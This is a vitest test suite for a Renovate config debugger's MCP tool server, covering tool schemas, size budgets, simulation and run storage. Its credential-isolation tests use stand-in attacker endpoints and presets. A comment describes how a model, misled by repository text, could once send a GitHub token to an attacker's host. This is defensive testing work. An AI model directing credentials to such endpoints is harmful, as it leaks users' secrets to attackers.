import { Client } from "@modelcontextprotocol/client";
import { InMemoryTransport } from "@modelcontextprotocol/server";
import { serveStdio, type StdioServerHandle } from "@modelcontextprotocol/server/stdio";
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { getPresetAuth, setPresetAuth } from "@renovate-config-debugger/engine";
import pkg from "../../package.json";
import { createMcpServer } from "./server";
import { RESULT_BUDGET_BYTES } from "./result";
import { DEFAULT_RUN_LIMIT, RunStore } from "./run-store";
import { recordingIo } from "../test-harness";

/**
 * Roadmap 060: the tool surface, driven through a real MCP client over the
 * SDK's in-memory transport pair — so the schemas, the handlers and the
 * result shapes are exercised exactly as a client would.
 *
 * Under SDK v2 the server side is the PRODUCTION entry point — `serveStdio`
 * over that in-memory pair rather than over a process's stdio — because the
 * entry, not the server, owns the era decision. So the suite drives the exact
 * wiring `rcd mcp` does, including the choice between the 2026-07-28 protocol
 * and the legacy 2025-era handshake. The v2 client negotiates `legacy` unless
 * told otherwise, so every test below is a legacy-era run; "the tool surface"
 * adds one that pins 2026-07-28, and `test/bin.test.ts` proves the legacy era
 * over a real pipe.
 *
 * Thin, like the CLI's own tests: the answers themselves come from the shared
 * projection modules the subcommands use, and the engine's golden↔shimmed
 * suite owns the semantics underneath. What is NOT thin is the property tests
 * below — size budget, strictness, the credential guard — because those are
 * this transport's own failure modes.
 */

const CONFIG = '{"extends":[":dependencyDashboard"],"labels":["deps"]}';
const GROUPED =
  '{"labels":["deps"],"packageRules":[{"matchPackageNames":["react"],"groupName":"react"}]}';
/** The big one — every size assertion in this file is measured against it. */
const RECOMMENDED = '{"extends":["config:recommended"],"labels":["deps"]}';

/** The revision the modern era negotiates. */
const MODERN_PROTOCOL_VERSION = "2026-07-28";

let client: Client;
let close: () => Promise<void>;

interface ConnectOptions {
  env?: Record<string, string | undefined>;
  /** Omitted: the client's default, the 2025-era `initialize` handshake. */
  era?: "modern";
  /** A store the test can read back — what the server HELD, not what it answered. */
  store?: RunStore;
}

async function connect(options?: ConnectOptions): Promise<void> {
  const io = recordingIo(options?.env ? { env: options.env } : undefined);
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  // One factory, both eras — the entry pins ONE instance per connection.
  const handle: StdioServerHandle = serveStdio(
    () => createMcpServer(io, options?.store ? { store: options.store } : undefined),
    { transport: serverTransport },
  );
  client = new Client(
    { name: "test", version: "0" },
    options?.era === "modern"
      ? { versionNegotiation: { mode: { pin: MODERN_PROTOCOL_VERSION } } }
      : {},
  );
  await client.connect(clientTransport);
  close = async () => {
    await client.close();
    await handle.close();
  };
}

interface ToolText {
  isError?: boolean;
  content: { type: string; text: string }[];
}

/** The raw text a tool answered with — what the model's context actually pays for. */
async function callText(name: string, args: Record<string, unknown>): Promise<string> {
  const result = (await client.callTool({ name, arguments: args })) as ToolText;
  const text = result.content[0]?.text ?? "";
  if (result.isError) {
    throw new Error(text);
  }
  return text;
}

/** The one JSON document every tool answers with. */
async function call(name: string, args: Record<string, unknown>): Promise<unknown> {
  return JSON.parse(await callText(name, args)) as unknown;
}

async function runConfig(content: string): Promise<string> {
  const summary = (await call("run_config", { fileName: "renovate.json", content })) as {
    runId: string;
  };
  return summary.runId;
}

beforeEach(() => connect());
afterEach(async () => {
  vi.unstubAllGlobals();
  await close();
});

describe("tool surface", () => {
  test("advertises every tool the roadmap names, with its domain hints", async () => {
    const { tools } = await client.listTools();
    expect(tools.map((t) => t.name).toSorted()).toEqual([
      "compare_simulations",
      "explain_message",
      "get_final_config",
      "get_option_docs",
      "get_preset_node",
      "get_preset_tree",
      "get_provenance",
      "get_resolved_config",
      "run_config",
      "simulate",
    ]);
    const node = tools.find((t) => t.name === "get_preset_node");
    expect(node?.description).toContain("one node at a time");
  });

  test("the workflow is in `instructions`, and the server names its own version", () => {
    const info = client.getServerVersion();
    expect(info?.name).toBe("renovate-config-debugger");
    // The SERVER's version, by convention — Renovate's lives in the title.
    expect(info?.version).toBe(pkg.version);
    expect(info?.title).toMatch(/^Renovate Config Debugger \(Renovate \d+\./);
    const instructions = client.getInstructions() ?? "";
    expect(instructions).toContain("run_config FIRST");
    expect(instructions).toContain("compare_simulations");
    // A paragraph, not a manual.
    expect(instructions.length).toBeLessThan(1_200);
  });

  test("every tool declares itself read-only; only run_config reaches the network", async () => {
    const { tools } = await client.listTools();
    for (const tool of tools) {
      expect(tool.annotations?.readOnlyHint, tool.name).toBe(true);
      expect(tool.annotations?.destructiveHint, tool.name).toBe(false);
      expect(tool.annotations?.openWorldHint, tool.name).toBe(tool.name === "run_config");
      expect(tool.annotations?.idempotentHint, tool.name).toBe(tool.name !== "run_config");
    }
  });

  /**
   * Every other test here drives the 2025-era `initialize` handshake (the v2
   * client's default), which is what today's hosts speak; this one pins
   * 2026-07-28, so ONE process provably answers both. The entry decides per
   * connection off the same factory and the same registrations, so what is
   * worth asserting is that the surface and the answers do not move with it.
   */
  test("the same server answers the 2026-07-28 era, not just the legacy handshake", async () => {
    await close();
    await connect({ era: "modern" });
    expect(client.getProtocolEra()).toBe("modern");
    expect(client.getNegotiatedProtocolVersion()).toBe(MODERN_PROTOCOL_VERSION);

    const { tools } = await client.listTools();
    expect(tools.map((t) => t.name).toSorted()).toEqual([
      "compare_simulations",
      "explain_message",
      "get_final_config",
      "get_option_docs",
      "get_preset_node",
      "get_preset_tree",
      "get_provenance",
      "get_resolved_config",
      "run_config",
      "simulate",
    ]);

    // A whole drill-down, not just a handshake: the held run survives the era.
    const runId = await runConfig(CONFIG);
    const entry = (await call("get_provenance", { runId, key: "labels" })) as { winner: string };
    expect(entry.winner).toBe("repo");
    // The strictness the tool descriptions promise is schema-level, so it has
    // to hold on both wires.
    await expect(call("get_preset_tree", { runId, dept: 3 })).rejects.toThrow(/dept/);
  });
});

describe("run_config", () => {
  test("returns a handle and a summary, not the trace", async () => {
    const summary = (await call("run_config", {
      fileName: "renovate.json",
      content: CONFIG,
    })) as Record<string, unknown>;
    expect(summary.runId).toBe("run-1");
    expect(summary.accepted).toBe(true);
    expect(summary.digest).toContain("Renovate accepted this config");
    expect(summary.treeSummary).toMatchObject({ resolved: 1 });
    expect(summary).not.toHaveProperty("events");
    expect(summary).not.toHaveProperty("finalConfig");
  });

  test("a config Renovate would refuse says so instead of failing", async () => {
    const summary = (await call("run_config", {
      fileName: "renovate.json",
      content: '{"labels":5}',
    })) as { accepted: boolean; errors: { message: string }[] };
    expect(summary.accepted).toBe(false);
    expect(summary.errors[0]?.message).toContain("labels");
  });

  test("the withheld-credentials note names THIS transport's opt-ins, not the CLI flags", async () => {
    await close();
    await connect({ env: { GITHUB_TOKEN: "gh-token" } });
    const summary = (await call("run_config", {
      fileName: "renovate.json",
      content: "{}",
      globalConfig: { endpoint: "https://not-mine.example/api/v3/" },
    })) as { notes?: string[] };
    const note = summary.notes?.join(" ") ?? "";
    expect(note).toContain("credentials withheld");
    expect(note).toContain("trustEndpoints: true");
    expect(note).toContain("platformOverride: true");
    expect(note).not.toContain("--trust-endpoints");
  });
});

describe("credential isolation", () => {
  /**
   * The race the endpoint guard used to lose. Handlers run CONCURRENTLY, so a
   * trusted run installing tokens while an untrusted run is still fetching
   * presets would put those tokens on the untrusted run's remaining requests —
   * to the endpoint that config chose. The credentials now travel on the
   * pipeline input, so no run can observe another's.
   */
  test("two interleaved runs: no request carries the other run's token", async () => {
    await close();
    await connect({ env: { GITHUB_TOKEN: "gh-token" } });
    const before = getPresetAuth();
    const requests: { url: string; authorization: string | null }[] = [];
    vi.stubGlobal("fetch", (input: unknown, init?: RequestInit) => {
      requests.push({
        url: String(input),
        authorization: new Headers(init?.headers).get("authorization"),
      });
      return Promise.resolve(new Response("not found", { status: 404 }));
    });
    const [untrusted, trusted] = await Promise.all([
      call("run_config", {
        fileName: "renovate.json",
        content: '{"extends":["github>attacker/untrusted"]}',
        globalConfig: { endpoint: "https://not-mine.example/api/v3/" },
      }),
      call("run_config", {
        fileName: "renovate.json",
        content: '{"extends":["github>mine/trusted"]}',
        trustEndpoints: true,
      }),
    ]);
    expect((untrusted as { notes?: string[] }).notes?.join(" ")).toContain("credentials withheld");
    expect(trusted).not.toHaveProperty("notes");

    const forUntrusted = requests.filter((r) => r.url.includes("attacker"));
    const forTrusted = requests.filter((r) => r.url.includes("mine"));
    expect(forUntrusted.length).toBeGreaterThan(0);
    expect(forTrusted.length).toBeGreaterThan(0);
    // The whole point: the run whose config chose the endpoint never sent a
    // token, no matter what the concurrent trusted run installed.
    expect(forUntrusted.map((r) => r.authorization)).toEqual(forUntrusted.map(() => null));
    expect(forTrusted.map((r) => r.authorization)).toEqual(forTrusted.map(() => "Bearer gh-token"));
    // Module state is exactly what it was: a run owns its auth for the length
    // of its own queued task and hands it back.
    expect(getPresetAuth()).toEqual(before);
  });

  /**
   * M3 (roadmap 068). The guard used to inspect the GLOBAL CONFIG only — but
   * `endpoint` is also a parameter of this tool, and over MCP the model fills
   * it in, plausibly from text in the repository it was asked to inspect.
   * `run_config({content: '{"extends":["local>me/presets"]}', endpoint:
   * "https://ghe.attacker.example/api/v3/"})` sent RCD_GITHUB_TOKEN there with
   * no opt-in at all. The CLI is unaffected: a person typed the flag.
   */
  test("an endpoint the CALLER chose withholds tokens until it is vouched for", async () => {
    await close();
    await connect({ env: { GITHUB_TOKEN: "gh-token" } });
    const requests: { url: string; authorization: string | null }[] = [];
    vi.stubGlobal("fetch", (input: unknown, init?: RequestInit) => {
      requests.push({
        url: String(input),
        authorization: new Headers(init?.headers).get("authorization"),
      });
      return Promise.resolve(new Response("not found", { status: 404 }));
    });
    const args = {
      fileName: "renovate.json",
      content: '{"extends":["github>elsewhere/presets"]}',
      endpoint: "https://ghe.attacker.example/api/v3/",
    };

    const guarded = (await call("run_config", args)) as { notes?: string[] };
    expect(guarded.notes?.join(" ")).toContain("credentials withheld");
    // `platformOverride` is NOT the opt-in here: it only decides whose
    // endpoint wins, and both candidates are values this caller supplied.
    const overridden = (await call("run_config", { ...args, platformOverride: true })) as {
      notes?: string[];
    };
    expect(overridden.notes?.join(" ")).toContain("credentials withheld");
    expect(requests.length).toBeGreaterThan(0);
    expect(requests.map((r) => r.authorization)).toEqual(requests.map(() => null));

    requests.length = 0;
    const vouched = (await call("run_config", { ...args, trustEndpoints: true })) as {
      notes?: string[];
    };
    expect(vouched).not.toHaveProperty("notes");
    expect(requests.length).toBeGreaterThan(0);
    expect(requests.every((r) => r.authorization === "Bearer gh-token")).toBe(true);
  });

  test("a run never installs its credentials outside the engine's queue", async () => {
    await close();
    await connect({ env: { GITHUB_TOKEN: "gh-token" } });
    setPresetAuth({});
    await runConfig(CONFIG);
    expect(getPresetAuth()).toEqual({});
  });
});

describe("drill-down", () => {
  test("the tree comes without bodies; a body is one node at a time", async () => {
    const runId = await runConfig(CONFIG);
    const tree = (await call("get_preset_tree", { runId })) as {
      root: { children: { name: string }[] };
    };
    expect(tree.root.children[0]?.name).toBe(":dependencyDashboard");
    expect(JSON.stringify(tree)).not.toContain("dependencyDashboardTitle");

    const node = (await call("get_preset_node", {
      runId,
      node: ":dependencyDashboard",
      body: "input",
    })) as { input: { dependencyDashboard: boolean } };
    expect(node.input.dependencyDashboard).toBe(true);
  });

  test("a node's own children are one level, not zero — depth is relative to the query", async () => {
    // Regression: get_preset_node used to pass viewOf an ABSOLUTE depth limit
    // of 1, but config:recommended already sits at depth 1 (root is depth 0),
    // so every real preset was cut before its children ever showed.
    const runId = await runConfig(RECOMMENDED);
    const node = (await call("get_preset_node", {
      runId,
      node: "config:recommended",
    })) as {
      node: {
        children?: { name: string; children?: unknown; childrenOmitted?: number }[];
        childrenOmitted?: number;
      };
    };
    expect(node.node.childrenOmitted).toBeUndefined();
    expect(node.node.children).toBeDefined();
    const children = node.node.children ?? [];
    expect(children.length).toBeGreaterThan(0);
    expect(children.map((c) => c.name)).toContain(":dependencyDashboard");
    // One level only: a grandchild-bearing child summarizes its own children
    // as childrenOmitted rather than recursing into them.
    const grandparent = children.find((c) => c.name === "group:monorepos");
    expect(grandparent?.children).toBeUndefined();
    expect(grandparent?.childrenOmitted).toBeGreaterThan(0);
  });

  test("provenance answers who set a key", async () => {
    const runId = await runConfig(CONFIG);
    const entry = (await call("get_provenance", { runId, key: "labels" })) as {
      winner: string;
      chain: { layer: string }[];
    };
    expect(entry.winner).toBe("repo");
    expect(entry.chain.length).toBeGreaterThan(0);
  });

  /**
   * Roadmap 068 (2 persona sessions + the review): provenance answers "which
   * LAYER set this", and both personas read a static winner as "the value
   * Renovate will use" for an update a packageRule actually overrides.
   */
  test("a key packageRules can also set says so, and points at the simulator", async () => {
    const runId = await runConfig(GROUPED);
    const grouped = (await call("get_provenance", { runId, key: "groupName" })) as {
      note?: string;
    };
    expect(grouped.note).toContain("1 packageRule can set `groupName` per-dependency");
    expect(grouped.note).toContain("Simulate a dependency");
    // A key no rule touches carries no such caveat.
    const labels = (await call("get_provenance", { runId, key: "labels" })) as { note?: string };
    expect(labels.note).toBeUndefined();
  });

  test("the resolved document keeps internal presets by default", async () => {
    const runId = await runConfig(CONFIG);
    const output = (await call("get_resolved_config", { runId })) as {
      config: { extends: string[] };
    };
    expect(output.config.extends).toEqual([":dependencyDashboard"]);
  });

  test("an expired or invented runId says which runs are held", async () => {
    await expect(call("get_final_config", { runId: "run-404" })).rejects.toThrow(
      /no run "run-404"/,
    );
  });
});

describe("honest empties", () => {
  test("a run that never merged says so instead of answering `{}`", async () => {
    // A parse failure stops the pipeline long before the merge stage.
    const runId = await runConfig("{ not json");
    await expect(call("get_final_config", { runId })).rejects.toThrow(
      /produced no effective config/,
    );
    await expect(call("simulate", { runId, dep: { depName: "react" } })).rejects.toThrow(
      /produced no effective config/,
    );
  });

  test("a body the run never recorded is an explicit null with a note", async () => {
    // An unknown INTERNAL preset: it fails without a network round-trip, so
    // the fixture cannot flake on a rate limit.
    const runId = await runConfig('{"extends":[":nope"]}');
    const node = (await call("get_preset_node", {
      runId,
      node: ":nope",
      body: "resolved",
    })) as { body: string; resolved: unknown; note?: string };
    expect(node.body).toBe("resolved");
    expect(node.resolved).toBeNull();
    expect(node.note).toContain("no `resolved` body");
  });
});

describe("size budget", () => {
  test("a big answer is compact, a small one is readable", async () => {
    const runId = await runConfig(CONFIG);
    expect(await callText("get_provenance", { runId, key: "labels" })).toContain("\n  ");
    const tree = await callText("get_preset_tree", { runId: await runConfig(RECOMMENDED) });
    expect(tree.length).toBeGreaterThan(4_000);
    expect(tree).not.toContain("\n");
  });

  test("keyless provenance is an index, not every chain", async () => {
    const runId = await runConfig(RECOMMENDED);
    const text = await callText("get_provenance", { runId });
    // Was ~634 kB: every non-noop chain step of every key, before and after.
    expect(text.length).toBeLessThan(10_000);
    const payload = JSON.parse(text) as {
      note: string;
      keys: { key: string; winner: string; preview: string }[];
    };
    expect(payload.note).toContain("pass `key`");
    const labels = payload.keys.find((k) => k.key === "labels");
    expect(labels).toMatchObject({ winner: "repo", preview: '["deps"]' });
    expect(labels).not.toHaveProperty("chain");
  });

  test("depth is capped, and the cap explains itself", async () => {
    const runId = await runConfig(RECOMMENDED);
    await expect(call("get_preset_tree", { runId, depth: 99 })).rejects.toThrow(
      /depth|less than or equal to 6|<=6/i,
    );
    const { tools } = await client.listTools();
    const tree = tools.find((t) => t.name === "get_preset_tree");
    expect(JSON.stringify(tree?.inputSchema)).toContain("max 6");
  });

  test("an answer over the budget is elided structurally, and says how to narrow", async () => {
    const runId = await runConfig(RECOMMENDED);
    const text = await callText("get_provenance", { runId, key: "packageRules" });
    expect(text.length).toBeLessThanOrEqual(RESULT_BUDGET_BYTES);
    // Never cut mid-JSON.
    const payload = JSON.parse(text) as { truncated?: boolean; hint?: string };
    expect(payload.truncated).toBe(true);
    expect(payload.hint).toContain("get_preset_node");
  });

  test("the elision marks what it dropped, in place", async () => {
    const runId = await runConfig(RECOMMENDED);
    const payload = (await call("get_final_config", { runId })) as {
      truncated: boolean;
      finalConfig: { packageRules: { truncated: boolean; shown: number; omitted: number } };
    };
    expect(payload.truncated).toBe(true);
    const rules = payload.finalConfig.packageRules;
    expect(rules.truncated).toBe(true);
    expect(rules.omitted).toBeGreaterThan(0);
    expect(rules.shown).toBeGreaterThan(0);
  });
});

describe("strict input schemas", () => {
  test("a typo'd dependency field is named, not silently dropped", async () => {
    const runId = await runConfig(GROUPED);
    await expect(
      call("simulate", { runId, dep: { depname: "react", currentValue: "17.0.0" } }),
    ).rejects.toThrow(/depname/);
  });

  test("a typo'd tool parameter is named too", async () => {
    const runId = await runConfig(CONFIG);
    await expect(call("get_preset_tree", { runId, dept: 3 })).rejects.toThrow(/dept/);
  });

  test("the advertised schemas forbid unknown keys", async () => {
    const { tools } = await client.listTools();
    for (const tool of tools) {
      expect(tool.inputSchema.additionalProperties, tool.name).toBe(false);
    }
  });

  /**
   * Roadmap 068, from the persona study: two sessions burned actions on an
   * "Invalid input, Invalid input" rejection that named no field. This pins
   * what the SDK actually reports for the shapes those sessions produced —
   * the zod issue PATH, joined and prefixed — so a schema change that loses
   * the field name is a failing test rather than a lost session. The commonest
   * mistake by far is the first one: `content` is the file's TEXT.
   */
  test("a rejected argument names the field, and its type", async () => {
    const errorFor = async (name: string, args: Record<string, unknown>): Promise<string> => {
      const result = (await client.callTool({ name, arguments: args })) as ToolText;
      expect(result.isError, JSON.stringify(args)).toBe(true);
      return result.content[0]?.text ?? "";
    };
    expect(
      await errorFor("run_config", { content: { extends: ["config:recommended"] } }),
    ).toContain("content: Invalid input: expected string, received object");
    expect(await errorFor("run_config", { fileName: "renovate.json" })).toContain(
      "content: Invalid input: expected string, received undefined",
    );
    expect(await errorFor("simulate", { runId: "run-1", dep: { depName: 5 } })).toContain(
      "dep.depName: Invalid input: expected string, received number",
    );
    expect(await errorFor("simulate", { runId: "run-1", dep: {}, verdict: "sometimes" })).toContain(
      'verdict: Invalid option: expected one of "notable"',
    );
  });

  test("the content parameter says it wants the file's text", async () => {
    const { tools } = await client.listTools();
    const runConfigTool = tools.find((t) => t.name === "run_config");
    const content = (
      runConfigTool?.inputSchema.properties as { content?: { description?: string } } | undefined
    )?.content;
    expect(content?.description).toContain("JSON *string*");
    expect(content?.description).toContain("not the parsed object");
  });
});

describe("simulate and compare", () => {
  test("updateType is derived, and the verdict carries clause evidence", async () => {
    const runId = await runConfig(GROUPED);
    const sim = (await call("simulate", {
      runId,
      dep: {
        depName: "react",
        packageName: "react",
        currentValue: "17.0.0",
        newValue: "18.0.0",
      },
    })) as {
      dep: { updateType: string };
      rules: { verdict: string; clauses: { key: string; state: string }[] }[];
    };
    expect(sim.dep.updateType).toBe("major");
    expect(sim.rules[0]?.verdict).toBe("matched");
    expect(sim.rules[0]?.clauses[0]).toMatchObject({ key: "matchPackageNames" });
  });

  /**
   * H1 (roadmap 068, 6 of 9 persona sessions). The whole `SimulationResult`
   * for `config:recommended` + a react update is 1.36 MB, of which
   * `mergeSteps` is 797 kB and `rawFinalConfig` 199 kB — and the elision spent
   * the budget on them, answering with 2 of 713 rules and no merge trace
   * anyway. The default answer is now the question that was asked.
   */
  test("the merge trace is opt-in, so the verdict is what comes back", async () => {
    const runId = await runConfig(RECOMMENDED);
    const dep = { depName: "react", packageName: "react", currentValue: "17", newValue: "18" };
    const text = await callText("simulate", { runId, dep });
    const parsed = JSON.parse(text) as {
      truncated?: boolean;
      omittedKeys?: string[];
      detailNote: string;
      finalDependencyConfig: Record<string, unknown>;
      flattened: unknown;
      rules: { truncated: boolean; shown: number; omitted: number } | unknown[];
    };
    expect(parsed).not.toHaveProperty("mergeSteps");
    expect(parsed).not.toHaveProperty("rawFinalConfig");
    // The omission is stated, with the parameter that undoes it.
    expect(parsed.detailNote).toContain('detail: "full"');
    // The answer itself survives WHOLE — no key was dropped to make room.
    expect(parsed.omittedKeys).toBeUndefined();
    expect(parsed.flattened).toBeDefined();
    expect(Object.keys(parsed.finalDependencyConfig).length).toBeGreaterThan(10);
    // And the rule list is a real sample of 713, not a token two.
    const rules = parsed.rules as { shown: number; omitted: number };
    expect(rules.shown + rules.omitted).toBeGreaterThan(700);
    expect(rules.shown).toBeGreaterThan(20);
  });

  /**
   * And the other half of the argument for the default: `full` asks for the
   * merge trace, and a merge step is a whole config snapshot — even this
   * three-line config's is far over the budget, so the answer comes back with
   * the trace elided or dropped BY NAME. That is the honest outcome of asking
   * for it; it is not the shape to spend a call on by accident.
   */
  test('detail: "full" asks for the merge trace, and pays for it', async () => {
    const runId = await runConfig(GROUPED);
    const dep = { depName: "react", packageName: "react" };
    const full = (await call("simulate", { runId, dep, detail: "full" })) as {
      truncated?: boolean;
      omittedKeys?: string[];
      detailNote?: string;
    };
    expect(full.detailNote).toBeUndefined();
    expect(full.truncated).toBe(true);
    expect(full.omittedKeys).toContain("mergeSteps");
    // The default answer for the same question never got that big.
    const verdict = (await call("simulate", { runId, dep })) as { truncated?: boolean };
    expect(verdict.truncated).toBeUndefined();
  });

  test("verdict/source scope the rule list and say what they hid", async () => {
    const runId = await runConfig(GROUPED);
    const dep = { depName: "react", currentValue: "17.0.0", newValue: "18.0.0" };
    const full = (await call("simulate", { runId, dep })) as { rules: unknown[] };
    // GROUPED's rules all match this dep, so `no-match` is the facet that
    // provably hides something.
    const scoped = (await call("simulate", { runId, dep, verdict: "no-match" })) as {
      rules: { verdict: string }[];
      ruleFilter: { verdict: string; total: number; shown: number; hidden: number };
    };
    // An unflagged call keeps the exact payload scripts already parse.
    expect(full).not.toHaveProperty("ruleFilter");
    expect(full.rules.length).toBeGreaterThan(0);
    expect(scoped.rules.every((rule) => rule.verdict === "no-match")).toBe(true);
    expect(scoped.ruleFilter.total).toBe(full.rules.length);
    expect(scoped.ruleFilter.shown).toBe(scoped.rules.length);
    expect(scoped.ruleFilter.hidden).toBe(full.rules.length - scoped.rules.length);
    expect(scoped.ruleFilter.hidden).toBeGreaterThan(0);
  });

  test("two runs, one dependency: the edit oracle", async () => {
    const before = await runConfig(CONFIG);
    const after = await runConfig(GROUPED);
    const dep = { depName: "react", packageName: "react" };
    const comparison = (await call("compare_simulations", {
      runId: before,
      runIdB: after,
      dep,
    })) as { noChange: boolean; summary: string; matchedOnlyInB: { label: string }[] };
    expect(comparison.noChange).toBe(false);
    expect(comparison.matchedOnlyInB[0]?.label).toBe("matchPackageNames");
    // Roadmap 068 (4 of 9 persona sessions): the net effect, before anyone has
    // to assemble it out of six arrays.
    expect(comparison.summary).toContain("differs: ");
    expect(comparison.summary).toContain("groupName");
  });

  test("the same run twice changes nothing", async () => {
    const runId = await runConfig(GROUPED);
    const comparison = (await call("compare_simulations", {
      runId,
      dep: { depName: "react", packageName: "react" },
    })) as { noChange: boolean; summary: string };
    expect(comparison.noChange).toBe(true);
    expect(comparison.summary).toBe(
      "identical: the same rules matched and the same effective config results",
    );
  });
});

describe("explain_message and get_option_docs", () => {
  test("a validator message is explained against the run it came from", async () => {
    const runId = await runConfig('{"labels":5}');
    const explained = (await call("explain_message", {
      runId,
      topic: "Configuration Error",
      message: "Configuration option `labels` should be a list (Array)",
    })) as { docsUrl?: string; message: string; severity: string };
    expect(explained.docsUrl).toContain("docs.renovatebot.com");
    expect(explained.severity).toBe("error");
  });

  test("a warning explained through the tool comes back a warning", async () => {
    // A globalOnly option in a repo config is a warning, not an error.
    const summary = (await call("run_config", {
      fileName: "renovate.json",
      content: '{"dryRun":"full"}',
    })) as { runId: string; warnings: { topic: string; message: string }[] };
    const runId = summary.runId;
    const warning = summary.warnings[0];
    expect(warning).toBeDefined();
    const explained = (await call("explain_message", {
      runId,
      topic: warning?.topic,
      message: warning?.message,
    })) as { severity: string };
    expect(explained.severity).toBe("warning");
  });

  test("option docs are for the pinned Renovate, and misses point at search", async () => {
    const doc = (await call("get_option_docs", { name: "packageRules" })) as {
      name: string;
      renovateVersion: string;
    };
    expect(doc.name).toBe("packageRules");
    expect(doc.renovateVersion).toMatch(/^\d+\./);
    await expect(call("get_option_docs", { name: "nopeNotAnOption" })).rejects.toThrow(/search/);
  });
});

/**
 * H2 (roadmap 068): a held `config:recommended` trace measured ~165 MB, 76 MB
 * of it events and 75 MB of THAT the logger shim's raw `log` records — which
 * nothing on this path reads. Four held runs were 713 MB of heap, in a process
 * an MCP host keeps alive for the length of a working session.
 */
describe("held runs carry only what the tools read", () => {
  test("a session holds three runs — the before/after oracle needs two", () => {
    expect(DEFAULT_RUN_LIMIT).toBe(3);
  });

  test("the held trace has no log events, and every tool still answers", async () => {
    const store = new RunStore();
    await close();
    await connect({ store });

    const runId = await runConfig(CONFIG);
    const held = store.get(runId);
    expect(held.result.events.length).toBeGreaterThan(0);
    expect(held.result.events.some((event) => event.kind === "log")).toBe(false);

    // Every drill-down answers from the stripped trace: the derivations index
    // stage/migration/preset events, and the tree, provenance and resolved
    // projections read no events at all.
    const summary = (await call("run_config", {
      fileName: "renovate.json",
      content: CONFIG,
    })) as { digest: string; treeSummary: { resolved: number } };
    expect(summary.digest).toContain("Renovate accepted this config");
    expect(summary.treeSummary.resolved).toBe(1);
    const tree = (await call("get_preset_tree", { runId })) as {
      root: { children: unknown[] };
    };
    expect(tree.root.children).toHaveLength(1);
    const provenance = (await call("get_provenance", { runId, key: "labels" })) as {
      winner: string;
    };
    expect(provenance.winner).toBe("repo");
    const resolved = (await call("get_resolved_config", { runId })) as {
      config: { extends: string[] };
    };
    expect(resolved.config.extends).toEqual([":dependencyDashboard"]);
    const explained = (await call("explain_message", {
      runId,
      message: "Configuration option `labels` should be a list (Array)",
    })) as { severity: string };
    expect(explained.severity).toBe("error");
    const sim = (await call("simulate", { runId, dep: { depName: "react" } })) as {
      rules: unknown[];
    };
    expect(Array.isArray(sim.rules)).toBe(true);
  });
});

describe("RunStore", () => {
  test("evicts the oldest run, and keeps the one being drilled into", () => {
    const store = new RunStore(2);
    // eslint-disable-next-line — the store only ever reads `result`/`input` back out
    const fake = { events: [], errors: [], warnings: [] } as unknown as Parameters<
      RunStore["put"]
    >[0];
    const input = { fileName: "renovate.json", content: "{}" };
    const a = store.put(fake, input);
    const b = store.put(fake, input);
    // Touching `a` makes `b` the least recently used.
    store.get(a.runId);
    const c = store.put(fake, input);
    expect(store.size).toBe(2);
    expect(() => store.get(b.runId)).toThrow(/no run/);
    expect(store.get(a.runId).runId).toBe(a.runId);
    expect(store.get(c.runId).runId).toBe(c.runId);
  });
});
